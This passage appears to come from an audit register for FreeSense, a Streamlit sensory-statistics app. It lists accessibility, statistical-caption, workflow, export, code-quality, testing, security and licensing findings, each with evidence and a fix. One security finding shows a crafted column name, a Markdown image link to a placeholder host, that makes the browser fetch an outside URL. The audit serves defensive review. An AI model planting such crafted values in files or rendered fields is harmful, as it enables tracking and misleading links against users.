- Evidence: The frontend applies a Styler `background-color` as `bgCell` and keeps the body text colour (`textDark`) unless the background is literally `yellow` (bundle excerpt: `let a=Zh(t,'background-color',n);a&&(r.bgCell=a),a==='yellow'&&i===void 0&&(r.textDark='#31333F')`). With the dark theme (`textColor #F1F5F9`), text on `#ffe0e0` has a contrast of **1.13:1**. Untestable rows use `#9e9e9e` on white: **2.68:1**. WCAG AA for normal text is 4.5:1. The dark theme is declared in `.streamlit/config.toml` and is chosen automatically for users whose OS is in dark mode. Other significance-shaded tables use `rgba(40,167,69,0.15-0.2)` (`modules/rata/ui.py:532,637`, `modules/cata/ui.py:1308`, `modules/descriptive/workflow.py:847`). These are translucent, so they stay legible on both themes.
- Impact: Dark-theme users of Liking Step 6 cannot read the rows the table exists to highlight: the significant penalties.
- Recommendation: Use a translucent tint such as `rgba(214,39,40,0.18)`, as the other modules do, or set a text colour together with the background. Raise the greyed text to at least `#6b6b6b` on light.
- Effort: S
- Dependencies: none

### UI-03: The brand teal fails WCAG AA contrast for text on primary buttons
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: MEDIUM
- Confidence: VERIFIED (computed ratio; the frontend uses white text on `primary`)
- Location: `.streamlit/config.toml` `[theme] primaryColor = "#0D9488"`
- Evidence: `contrast.py`: white on `#0D9488` is **3.74:1**. Teal on white (links, tertiary accents) is also 3.74:1, and on the sidebar `#F8FAFC` it is 3.58:1. On the dark background it is 4.77:1. Every "Open module", "Run full analysis & continue", "Run preference map" and "Fit PREFMAP models" button is `type="primary"` with normal-weight label text of about 14 to 16 px, which needs 4.5:1. The rest of the theme passes: body text 17.9:1 (light) and 16.3:1 (dark), captions at 60% alpha 4.69:1 (light) and 6.48:1 (dark), plot text 17.4 and 16.3, muted plot lines 7.5 and 7.0. Borders are 1.23:1 (light) and 1.72:1 (dark). That is decorative and acceptable only because widgets also have other cues.
- Impact: Primary actions are harder to read for low-vision users. If an institutional customer requires WCAG AA, this fails their audit.
- Recommendation: Use `#0F766E` (teal-700): white on it is 5.47:1, and on the dark background it is 3.26:1, which meets the 3:1 bar for non-text indicators such as the radio dot and slider. If the logo's teal must stay, keep it only in the logo and use the darker shade for `primaryColor`.
- Effort: S
- Dependencies: none

### UI-04: The preference-surface guide says "green = high, red = low", but the colour-blind palette makes red mean high
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `utils/plotting.py:111-127` (`diverging_liking_ramp` returns `RdBu_r`, red = high, when the palette is `colourblind`; otherwise `RdYlGn`, red = low); `utils/ui_shell.py:892-951` (`render_prefmap_explanation_expander` hard-codes "Green regions: high predicted average liking; Red regions: low"); used at `modules/prefmap/workflow.py:1388-1390`
- Evidence: With the colour-blind palette, `modules/prefmap/workflow.py:1374` renders the caption "Red = high predicted average liking, blue = low …". A few lines further down, the expander says red is low. The same ramp flip applies to the Liking consumer heatmaps (`modules/liking/workflow.py:1051,1486,1709`), where the captions are correct but red changes meaning when the palette changes. The expander also names the model-selection criterion "AIC", while `stats/prefmap.py:128-140` uses AICc, and it describes a "Heatmap/Contour" surface style option.
- Impact: A user reading the guide can invert the surface: the high-liking region is taken for the low one. That is a wrong product-positioning conclusion drawn from a correct computation.
- Recommendation: Keep one direction across palettes. For example, low = blue or purple and high = orange or brown on both, or a sequential cividis/viridis ramp for this one-directional quantity. Generate the expander's colour sentence from `describe_liking_ramp`. Change "AIC" to "AICc".
- Effort: S
- Dependencies: UI-05

### UI-05: Semantic red/green colours ignore the colour-blind setting, and some carry meaning by colour alone
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: MEDIUM
- Confidence: VERIFIED (colour values and ΔE computed); perceptual effect is simulated, not user-tested
- Location: `utils/colours.py:66-72` (`DRIVER_COLOUR_MAP`, documented as "must NOT change with the user's global palette"); used by `utils/plotting.py:525-531` (RATA frequency vs intensity driver scatter) and `:1355-1360` (DA driver classification); `modules/descriptive/ui.py:159-166` (discrimination heatmap red→yellow→green); `modules/liking/ui.py:42-46` (JAR distribution red/green); `modules/fusion/ui.py:733` (Q² heatmap red-white-green); `modules/descriptive/ui.py:41-43` plus `modules/descriptive/workflow.py:1712-1718` (per-assessor ICC and r below threshold shown only as red text)
- Evidence: `cvd.py`: "Robust Driver" `#2ca02c` against "No Discrimination" `#d62728` gives ΔE 119.8 with normal vision and **7.3 under deuteranopia**, which is close to indistinguishable. The DA heatmap's orange against light green gives ΔE 8.0 (deutan). In both scatters the class is carried by colour plus position relative to the dashed α lines. The marker symbol is the same for every class and attribute names appear only on hover. In the DA "By attribute" table, values below the ICC/r threshold differ from the others only in red text. The Styler-shaded "Yes" cells elsewhere are fine because they contain text.
- Impact: About 8% of men (deuteranopia and deuteranomaly) cannot reliably tell "robust driver" from "no discrimination", or see which assessor/attribute cells are below threshold, even after choosing the "Colour-blind safe" palette.
- Recommendation: Route semantic colours through the palette setting, or pick semantic colours that are CVD-safe by default (blue/orange/grey classes). Add a second channel: `symbol=` per class in the driver scatters, and a text flag column (for example "below 0.50") in the DA detail table.
- Effort: M
- Dependencies: none

### UI-06: The "Colour-blind safe" product palette includes a yellow that almost disappears on white, and the default palette has a deuteranopia-confusable pair
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: MEDIUM
- Confidence: VERIFIED (computed)
- Location: `utils/colours.py:19-33` (`PRODUCT_PALETTES`)
- Evidence: `contrast.py`/`pal.py`: in the `colourblind` palette, colour 4 is `#F0E442` at **1.32:1** on white. WCAG 1.4.11 asks for 3:1 for graphical objects such as spider lines, markers and thin bars. Six of the eleven colours are under 3:1 on white. In the default `Bold` palette, colour 4 `#F2B701` is 1.82:1, and colours 2 and 5 (`#11a579`, `#e73f74`) have ΔE **7.1** under deuteranopia. Products are assigned colours alphabetically (`get_product_colour_map`), so any study with 5 or more products gets that pair. The `muted` (Pastel) palette is under 3:1 for all eleven colours, and the default cluster palette (`Set2`) for all eight.
- Impact: Users who choose the accessibility option lose one product's line in spider plots and profile charts. With the default palette, two products can look the same to colour-blind users when the legend is the only key.
- Recommendation: In the `colourblind` list, move `#F0E442` last or drop it. Okabe-Ito guidance itself warns against yellow for lines on white. Consider making the colour-blind palette the default. Mark the Pastel options as "for dark backgrounds or large fills".
- Effort: S
- Dependencies: none

### UI-07: The DA discrimination heatmap is empty for designs without replicates and always states α = 0.05
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `modules/descriptive/workflow.py:1233-1238` (`plot_discrimination_heatmap(disc_df, col_map)` called without `alpha`); `modules/descriptive/ui.py:145-186` (pivots `neg_log_p`; title "Colour centred at significance threshold (α={alpha})"); `stats/panel_performance.py:93-103` (the no-replicate path sets `neg_log_p = NaN` and fills `range_score`)
- Evidence: `disc_norep.py` on sensochoc Session 1 only: `neg_log_p count 0`, `range_score count 406`, `heatmap z finite cells: 0 of 406`. The panel still renders the empty chart under the caption "uses an alternative proxy measure". The expander above it says "The heatmap then shows the percentile rank of this range score". For replicated designs, the colour midpoint and title use the default 0.05 whatever `da_alpha` the user set (for example 0.10, which `tests/test_apptest_da.py` uses).
- Impact: Panel leaders without replicate sessions, a common screening design, get a blank discrimination panel whose text says otherwise. With a non-default α, the green/red boundary and the title do not match the α used in the rest of the module.
- Recommendation: Plot `score` (or `range_score`) with its own legend when there are no replicates, or hide the chart and say why. Pass `alpha=st.session_state['da_alpha']`.
- Effort: S
- Dependencies: none

### UI-08: The only help or feedback route is the README; the Streamlit menu is left unconfigured
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `app.py:26-31` (`st.set_page_config` has no `menu_items`); `utils/ui_shell.py:343-351` (About button); `grep -rniE "mailto|issues|github.com|feedback|contact" app.py core modules utils` finds nothing user-facing
- Evidence: Per `streamlit docs st.set_page_config`, when `menu_items` is omitted, "Get help" and "Report a bug" are hidden and the menu's own About shows Streamlit's default dialog. Inside FreeSense, the only outward link is the `git clone https://github.com/...` line in the README shown as the About page. There is no issue-tracker link, no email, and no "how to cite this version" beyond the README citation, which says "Version 1.0".
- Impact: A scientist who hits a suspicious result or a crash has no route to report it. For a statistics tool, that is also how validation gaps get found after release.
- Recommendation: Set `menu_items={"Get help": <docs/methods URL>, "Report a bug": <issues URL or mailto>, "About": <one paragraph with version, licence, disclaimer>}`. Add a "Report a problem" tertiary link beside the sidebar About button. Include the version and module in the prefilled issue.
- Effort: S
- Dependencies: Decision D-2 (support channel)

### UI-09: The in-app About page is the developer README: 7 broken links, developer-only content, and step names that do not match the app
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `app.py:57-67`, `utils/docs.py:15` (`ABOUT_README = README.md`); `README.md` headings at lines 131-331
- Evidence: README has seven relative links (`CHANGELOG.md`, `CLAUDE.md`, `example_data/`, `example_data/README.md`, `LICENSE`, `Statistical_Methods_README.md`, `validation/README.md`). Rendered by `st.markdown` inside the app, they resolve against the app URL and do not open the files. The About footer tells users to "see LICENSE", and they cannot open it from the app. The page also contains Installation, `git clone`, Project Structure, Development Notes, and "Agent guidance … CLAUDE.md … `.claude/agents/`". The CATA step headings do not match the app: README has "Study Setup / Citation Frequencies / Cochran's Q / McNemar Post-Hoc & CLD / Reference-Product Contrast / Correspondence Analysis Map / Penalty Analysis vs Liking / Export", while `MODULES` has "Data upload & setup / Attribute frequency / Product discrimination / Product profiles / Contrast analysis / Correspondence analysis / Penalty analysis / Results & export". The same happens for RATA Step 1 ("Study Setup" vs "Data upload") and PrefMap Step 2 ("Preference Map" vs "External preference map"), and everything is in Title Case against the app's sentence case. README's module table calls RATA's panel "Consumer / semi-trained", while the landing page files RATA under "Trained panel" (`utils/ui_shell.py:45-48`, card text "trained or semi-trained assessors"). README line 154 says the penalty caveat renders "under every significant row", while CLAUDE.md says one caption for the whole table. The sidebar "Statistical methods reference" caption says "every statistical method used in this module" but opens the whole 257 KB document at the top.
- Impact: The page users open to learn what the tool does contradicts the step names they see, and it exposes internal tooling notes. It is also where a licence, a disclaimer and a feedback route would naturally go (UI-08, D-1).
- Recommendation: Write a short user-facing `ABOUT.md` for the overlay: purpose, modules with the panel type agreed per D-4, version, licence text or a summary, disclaimer, how to report problems, how to cite. Keep README for developers. Link to the methods document by section per module, or open it at the module's heading.
- Effort: M
- Dependencies: D-1, D-4


## LOW

### STAT-09: Tukey "fallback" to uncorrected paired t-tests is described as conservative
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B01-statistical-correctness.md`)
- Severity: LOW
- Confidence: VERIFIED (code); trigger is rare
- Location: `stats/posthoc.py:398-403`, `416-421`, `762-765`, `786-791`, `826-829`.
- Evidence: when the DA error MS is unavailable, or RATA RCBD df < 1, Tukey silently becomes uncorrected paired t (Fisher LSD). The comments call this "conservative"; it is the least conservative option. The error MS is taken from `full_df['MS']`, which is rounded to 4 decimals (`stats/da_anova.py:421`). An attribute whose true MS is below 5e-5 (proportions or very small scales) therefore resolves to 0, falls back, and loses multiplicity control. `t_edge.py` showed the fallback label "Paired t-test (Tukey-Kramer fallback)" in the pairwise table, while the CLD gives no indication.
- Impact: rare, but it gives anti-conservative letters under a Tukey label.
- Recommendation: do not round MS/SS in `full_df` (round for display only). Make the fallback apply a Bonferroni or Holm correction and surface the switch.
- Effort: S
- Dependencies: none

### STAT-11: Kendall's W UI caption says ties are not corrected, while the code applies the tie correction
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B01-statistical-correctness.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `modules/liking/workflow.py:1015-1020` against `stats/liking.py:381-404` (tie-corrected denominator, B.17).
- Evidence: the caption reads "Kendall's W is not adjusted for ties; … W may be slightly overestimated" whenever tied ranks exist. The code applies the Kendall/Wallis tie correction, and `ref_kendall.csv` matches to 1e-8.
- Impact: tells users the opposite of what was computed.
- Recommendation: replace the caption with "tie-corrected (n ties)".
- Effort: S
- Dependencies: none

### FUNC-10: DA/RATA default scale 0 to 100 is accepted silently for 0 to 10 data
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B02-functional-workflow.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `modules/descriptive/workflow.py:175-195`, `modules/rata/ui.py:195-203`
- Evidence: with sensochoc (0 to 10) and the default scale 0 to 100, DA Step 1 raises nothing and the Run button is enabled (`run_da.py`, "mapped (scale default 0-100)": 0 errors, 0 warnings). The scale feeds bar-chart axes (`workflow.py:523,580`), profile plots (`:1799,1848`) and scale-usage panel metrics. Liking already suggests a scale from the observed range (U2); DA/RATA only check values above the maximum.
- Impact: charts compressed into the bottom tenth of the axis; scale-usage metrics relative to the wrong range.
- Recommendation: show the observed min/max next to the scale inputs and warn when the data use less than about half of the declared range.
- Effort: S
- Dependencies: none

### FUNC-11: Gating messages reference step names and actions that do not exist
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B02-functional-workflow.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `modules/fusion/workflow.py:1053,1416,2393,2744`, `modules/prefmap/workflow.py:1494`
- Evidence: Fusion Steps 2 and 3 say "run the full analysis in the **1. Analysis Setup** step". Fusion has no "Run full analysis" button (the action is "Confirm matches"), and the sidebar label is sentence case. Other hard-coded labels: "**3. PLS Model Building**", "**2. Exploratory Overlay (PCA)**", "**2. External Preference Map**", which do not match the sidebar labels (`2. Exploratory overlay (PCA)` and so on) that `core.state.check_analysis_ready` derives from `MODULES`.
- Impact: small confusion; drift from the naming convention the project pins elsewhere.
- Recommendation: derive these messages from `MODULES` (`ui_shell.step_title`) and name the actual button.
- Effort: S
- Dependencies: none

### FUNC-12: The bundled CATA example opens with a red error
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B02-functional-workflow.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `modules/cata/ui.py:766-795`
- Evidence: bread file, after mapping consumer and product: "**Attribute columns contain values greater than 1.** ... use the **RATA module** instead", because the in-file `liking` column is not auto-designated; the user must pick it in "Consumer overall liking". The follow-up info box does explain the fix.
- Impact: the first run of the flagship example looks like a failure.
- Recommendation: when exactly one non-binary numeric column exists and it is named like `liking|hedonic|overall`, pre-select it as the liking column (the upload-derived default convention already exists for other widgets).
- Effort: S
- Dependencies: none

### IO-12: Browser modebar download: fixed 1200×800 at scale 2 and a generic file name
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B03-import-export.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `core/config.py:106-115`; `utils/ui_shell.py:996`
- Evidence:
  - The modebar exports every chart as `FreeSense_Plot_Export.<fmt>` at 1200×800 whatever the chart's aspect (for example 1000 px tall CVA or 1410 px tall butterfly plots are squashed or re-laid out), at 2400×1600 px for PNG. That is adequate for slides, not for print.
  - 77 of 81 `render_chart(` call sites pass `config=`. The other four fall back to Plotly's default modebar (PNG at screen size).
  - `render_chart` image names are `FreeSense_<key>_<preset>.<fmt>`, so per-attribute charts (for example the bar CLD for Acidity and for Sweetness) download under the same name.
  - Excel downloads are `FreeSense_<module>_Report_<YYYY-MM-DD>.xlsx`, so several exports on one day, or from different datasets, collide.
- Impact: overwritten or confusingly named files; distorted aspect ratios.
- Recommendation: use the figure's own height/width in `toImageButtonOptions`, and include attribute or dataset stem and time in the file names.
- Effort: S
- Dependencies: none

### CODE-05: A few broad `except Exception` blocks silently drop a result in UI paths
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B04-code-quality.md`)
- Severity: LOW
- Confidence: VERIFIED (code); impact SUSPECTED
- Location: `modules/liking/workflow.py:3092-3101` (PREFMAP fit in Step 7: `except Exception: pop('liking_prefmap_results')`, no message, no log); `utils/plotting.py:3074-3075` and `modules/liking/ui.py:450-451` (`except Exception: pass`); `utils/plotting.py:2935-2936` (KDE contour returns `None`).
- Evidence: 34 broad handlers in production code were read. Most are acceptable: file loaders re-raise as `ValueError` with the message (`core/data.py:22, 91`) or show `st.error`; `stats/` per-attribute handlers convert a failure into a NaN row with a `status`/`test` column (`stats/da_anova.py:460`, `stats/shared/frequency.py:105`, `stats/cata.py:1353`); `stats/liking.py:341-356` falls back to Wald and labels it in the `test` column; Fusion's PLS fit clears state and shows `st.error` (`modules/fusion/workflow.py:2338`); Liking's segmentation view logs with `_logger.exception` and shows a sanitised error (`:1993`). Streamlit's `RerunException`/`StopException` derive from `BaseException` (`streamlit/runtime/scriptrunner_utils/exceptions.py:22`), so none of these swallow `st.rerun()`/`st.stop()`. The four listed sites are the exceptions: the Liking PREFMAP failure removes the ideal-point markers and surface options with no explanation.
- Impact: a failure looks like a missing feature rather than an error. No wrong numbers are produced.
- Recommendation: in the Liking PREFMAP handler, `_logger.exception(...)` plus a one-line `st.caption` saying the per-consumer models could not be fitted. Leave the drawing-only `pass` blocks, but log at debug as `modules/prefmap/ui.py:229` does.
- Effort: S
- Dependencies: none

### CODE-06: Lint backlog is cosmetic, but E712 must not be auto-fixed, and the project claims no linter is configured
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B04-code-quality.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: repo-wide; `pyproject.toml [tool.ruff]`; `CLAUDE.md` ("No linter is configured").
- Evidence: `ruff check . --exclude env --statistics`: 226 findings (I001 75, F401 35, E701 34, E702 32, W293 23, E712 18, W292 4, E401 2, F541 1, F811 1, W291 1); 183 in production dirs. By file, E701/E702/I001/W293 cluster in `utils/export.py` (32), `modules/rata/ui.py` (24), `utils/plotting.py` (19).
  - **E712 (18):** every hit compares a pandas Series (`ideal_point_external`, `out_of_spec`, `converged`, `numerical_warning`). `ideal_point_external` holds `True/False/NaN` (`stats/prefmap.py:161, 184, 289`), so `== True` is the correct, NaN-safe test. `ruff --unsafe-fixes` rewrites `(s == False).sum()` to `(not s).sum()` (checked on a scratch copy of `stats/prefmap.py`), which raises `ValueError: The truth value of a Series is ambiguous`. Plain `ruff --fix` leaves E712 alone.
  - **F811 (1):** `modules/descriptive/ui.py:92`: a local list named `warnings` shadows an unused module-level `import warnings` (line 15). The function never calls the `warnings` module. No bug.
  - **F401 (35):** unused imports, 9 in `modules/descriptive/ui.py`; `core/config.py:9` imports `__version__` as `VERSION`, which ruff flags only for the unused `numpy` beside it. No F401 is a re-export that tests rely on (grep of `tests/`).
  - **F841 (ignored by config), run separately:** 21 unused locals; all read, none hides a bug (for example `modules/prefmap/workflow.py:1268` `n_degenerate` is computed but not displayed). B023 at `modules/fusion/workflow.py:817-820` is a false positive (the closure is called in the same iteration).
- Impact: none on results. The risk is a well-meaning pre-release "lint clean-up" using `--unsafe-fixes`, which would break PREFMAP counts and the RATA convergence banner.
- Recommendation: do not run a lint clean-up before release. Afterwards: `ruff check --fix` (safe fixes only) and a test run; add `"E712"` to `ignore` with a comment ("pandas Series comparisons are NaN-aware"), or rewrite as `.eq(True)`; add ruff to dev requirements; correct the CLAUDE.md sentence.
- Effort: S
- Dependencies: none

### CODE-07: Parallel copies of the contrast step, ideal-point overlay and confidence ellipse
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B04-code-quality.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: contrast renderers `modules/rata/ui.py` `render_contrast_step` (313 lines), `modules/descriptive/workflow.py` `render_contrast_step` (320), `modules/liking/ui.py` `render_contrast_step` (329), `modules/cata/ui.py` `render_step_5` (371). Ideal-point markers and model counts: `modules/prefmap/workflow.py:1233-1270` and `1591-1600` ("mirrors Step 2"), `modules/liking/workflow.py:3312-3320, 3370-3380`, and the counts again in `stats/prefmap.py:299-306`. Ellipses: `stats/cata.py:713` `_fit_confidence_ellipse`, `utils/plotting.py:301` `_ellipse_points`, `utils/plotting.py:2849` `compute_ellipse_points` (hard-codes 0.95 although `core/config.DEFAULT_ELLIPSE_CONFIDENCE` exists for exactly these overlays); the cluster-boundary block (ellipse/KDE fallback) is duplicated in `utils/plotting.py:3057-3075` and `modules/prefmap/ui.py:210-235`.
- Evidence: `difflib.SequenceMatcher` on stripped lines, RATA vs DA contrast renderer: 0.81 similarity. CODE-01 is a concrete case of this duplication drifting.
- Impact: maintenance cost and divergence risk. There is no present defect beyond CODE-01.
- Recommendation: after release, extract a shared contrast-step renderer parameterised by module config, a single `add_ideal_point_markers(fig, consumer_results, show_external)` helper, and route all 2-D χ² ellipses through one `stats/` function that takes the confidence. Do not do this before release.
- Effort: M
- Dependencies: none

### CODE-08: About 380 lines of dead functions and two obsolete scipy version probes
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B04-code-quality.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `utils/plotting.py:2377` `plot_penalty_bar` (99 lines), `:2478` `plot_penalty_bubble` (108); `modules/fusion/ui.py:336` `plot_q2_rmsecv` (78), `:420` `plot_correlation_loadings` (69); `stats/shared/frequency.py:289` `proportion_table` (21); `stats/data_fusion.py:611` `inverse_autoscale` (5). Probes: `modules/rata/ui.py:790-797`, `modules/descriptive/workflow.py:1013-1019`.
- Evidence: vulture at 60 % reported these; none is referenced in `app.py`, `core/`, `modules/`, `utils/`, `tests/` or `validation/` (grep). The other vulture hits (`render_*_module`) are false positives, resolved by string through `MODULES[...]["render"]`. The probes guard against scipy < 1.7, but `requirements.txt` pins `scipy>=1.13.0`. Every package in `requirements.txt` is imported by production code (matplotlib at one site, `utils/plotting.py:2894`; kaleido indirectly).
- Impact: none at runtime; it inflates the largest file and the coverage denominator.
- Recommendation: delete after release.
- Effort: S
- Dependencies: none

### CODE-09: Layer-rule test covers one file; a few statistics still live in `modules/` and `utils/`
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B04-code-quality.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `tests/test_stats_layer_moves.py:302-338` (scans only `modules/fusion/ui.py`); `modules/fusion/ui.py:588, 604` (Q-residual and leverage limits as `np.percentile(..., 95)` of the plotted products); `utils/plotting.py:327, 336` (Hotelling F / χ² ellipse quantiles), `:2341` (`stats.linregress` trend line), `:2849-2936` (χ² ellipse and KDE contour); `modules/liking/ui.py:436` (`np.polyfit`).
- Evidence: grep and reading. The `stats/` side is clean: no `st.*` other than the decorator, no session-state access, every cache bounded (`@st.cache_data without max_entries: 0 / 44`).
- Impact: small. The two Fusion control limits are statistical decisions made in the UI layer, outside the "only place" rule CLAUDE.md sets for the T² limit (F6), and they are untested.
- Recommendation: extend the AST scan to every file under `modules/` (allow `scipy.cluster.hierarchy.dendrogram` as a drawing helper). Move the Q/leverage limits next to `stats.pls.hotelling_t2_limit` when their method is reviewed (lead for B01).
- Effort: S
- Dependencies: none

### CODE-10: Pandas `DataFrameGroupBy.apply` FutureWarning in panel performance
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B04-code-quality.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `stats/panel_performance.py:138`
- Evidence: `_rank_column` reads only `neg_log_p` and `range_score`, so `include_groups=False` would give identical output. `requirements.txt` caps `pandas<3.0.0`, so the behaviour change cannot arrive through a normal install.
- Impact: noise in test output; a future pandas 3 upgrade would need it.
- Recommendation: add `include_groups=False` when pandas 3 is adopted.
- Effort: S
- Dependencies: none

### TEST-08: 94 tests (26%) skip without `example_data/`, and the skips are not reported by default
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B05-testing.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `tests/conftest.py::_existing`; `pytest.ini` (`addopts = -q`, no `-rs`)
- Evidence:
  - The collection plugin counted 94 of 366 items that request an example-data fixture. That covers all of `test_apptest_{cata,fusion,prefmap,rata}`, 9/10 DA and 11/12 Liking AppTests, 11/12 panel-performance tests, 8/18 export tests and all 3 stage-F pins.
  - `test_validation_pins.py` (7 tests) would **fail**, not skip, because its emitters `pd.read_excel` the example files.
  - `example_data/` is tracked in git (the `.gitignore` negations), so a normal clone has it.
- Impact: low today. It would matter for a packaged or sdist build that leaves the data out. There, a run would show about 272 passed plus a line of `s` characters, and most numerical pins would be silently absent.
- Recommendation: add `-rs` to `addopts`. In CI, set an env var such as `FREESENSE_REQUIRE_DATA=1` that turns `_existing`'s skip into a failure.
- Effort: S
- Dependencies: TEST-01

### PERF-07: `render_chart` docstring misdescribes kaleido behaviour
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B06-performance.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `utils/ui_shell.py:965-966`.
- Evidence: the docstring says kaleido 0.2.1 "starts a subprocess per export". Measured (`kaleido_t.py`): one persistent child process was reused for all 8 exports (`child_procs=1` throughout). The first PNG took 0.54 s and later PNGs 0.11 s. Four concurrent exports were serialised (0.12, 0.23, 0.34, 0.44 s; 0.46 s wall).
- Impact: none functionally. Export latency is not a concern, but the comment will mislead anyone sizing a hosted deployment.
- Recommendation: correct the docstring: one shared kaleido process, exports serialised behind its lock, about 0.1 s each after a cold start of about 0.5 s.
- Effort: S
- Dependencies: none

### SEC-06: Full Python tracebacks are shown to end users
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B07-security-privacy.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `.streamlit/config.toml` (no `[client] showErrorDetails`; `get_option('client.showErrorDetails')` returns `full`).
- Evidence: config query above. Uncaught exceptions render the traceback with absolute server paths in the browser.
- Impact: harmless locally; on a hosted server it discloses file paths and library versions.
- Recommendation: set `showErrorDetails = "type"` (or `"none"`) in the hosted configuration.
- Effort: S
- Dependencies: D-B07-1

### SEC-07: Uploaded column names are interpolated into st.markdown
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B07-security-privacy.md`)
- Severity: LOW
- Confidence: SUSPECTED (not rendered in a browser here)
- Location: `modules/cata/ui.py:778`, `modules/rata/ui.py:244`, `modules/descriptive/workflow.py:299`, `modules/liking/workflow.py:1218` and `:2156`.
- Evidence: f-strings put raw column names/demographic variable names inside `st.markdown`. HTML is escaped (no `unsafe_allow_html` anywhere, confirmed by grep), so no script execution; but Markdown syntax is honoured, so a column named `![x](https://host/pixel)` would make the browser fetch that URL.
- Impact: tracking pixel or misleading link from a crafted file; negligible for a self-uploaded file.
- Recommendation: wrap user strings in backticks or use `st.text`/`st.caption` with escaping (a small `_md_escape` helper).
- Effort: S
- Dependencies: none

### SEC-08: Repository history hygiene: home paths, private dataset names, dangling tracked symlink
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B07-security-privacy.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: git history; `.claude/skills/developing-with-streamlit` (tracked, mode 120000).
- Evidence: 130 lines with `/var/home/Lukas/...` or `/home/Lukas/...` in `git log --all -p`, all in deleted Markdown/planning files (confirms orientation). Deleted docs name private `data/` files: `DA_EPMF.xlsx`, `DA_Raw_Data.xlsx`, `Basic_liking_red.xlsx`, `Consumer_complexity_RATA-and-Liking.xlsx`, `rata_example.xlsx`, `cata_example.xlsx` (names only; no data rows from `data/` were found and no `data/` path was ever committed). Commit emails are GitHub noreply, `noreply@anthropic.com`, or placeholder `you@example.com` (14 commits); no personal email. The tracked `.claude/skills/developing-with-streamlit` is a symlink to `../../env/lib/python3.14/site-packages/streamlit/.agents/skills/...`, dangling in any fresh clone. `.claude/settings.local.json` (9.8 KB) was never committed, but it is ignored only by the owner's global git ignore (`~/.config/git/ignore:1`), not by the repo's `.gitignore`.
- Impact: low; reveals a username and a possible client/project code ("EPMF"). A collaborator without the global ignore could commit `settings.local.json`.
- Recommendation: add `.claude/settings.local.json` to `.gitignore`; decide whether `.claude/` ships at all (D-B07-3); fold path/name scrubbing into the SEC-04 history rewrite if one happens.
- Effort: S
- Dependencies: SEC-04

### REL-07: No project metadata; no bug-report route
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B08-packaging-licensing.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `pyproject.toml` (only `[tool.ruff]`); README has an Author line (`README.md:5`) but no contact, issues link or support statement
- Evidence: `pyproject.toml` contents; `grep -in "issue\|bug\|contact" README.md` finds only unrelated hits.
- Impact: no machine-readable name, version, licence, authors, `requires-python` or URLs; users have no stated route to report a wrong result, which for a statistics tool matters.
- Recommendation: add a `[project]` table (name, `dynamic = ["version"]` reading `core/__version__.py` or a static version, description, `license = "MIT"`, `license-files`, authors, `requires-python`, `dependencies`, `[project.urls]` Homepage/Issues/Changelog) even if the app is never built as a wheel; add a "Reporting problems" section to README naming the route (GitHub Issues once public, or an email).
- Effort: S
- Dependencies: D1

### REL-08: Example datasets: GPL notice present, but no copy of the GPL text is shipped
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B08-packaging-licensing.md`)
- Severity: LOW
- Confidence: VERIFIED (absence); requirement interpretation SUSPECTED
- Location: `example_data/README.md:11-23`, `README.md:435-452`; `git ls-files | grep -iE "copying|licen|gpl|notice"` returns only `LICENSE` (MIT)
- Evidence: attribution, source package, version, authors, licence name, download date and "reshaped" wording are present and good. GPL-2.0 s.1 and GPL-3.0 s.4 ask that recipients receive a copy of the licence with the material; none is in the repo. The files are modified (reshaped columns, dropped `Rank`), which the README states, satisfying the modification-notice point in spirit.
- Impact: small compliance gap for anyone redistributing the repo with `example_data/`. Whether data tables are copyrightable at all is a separate question (Decisions raised).
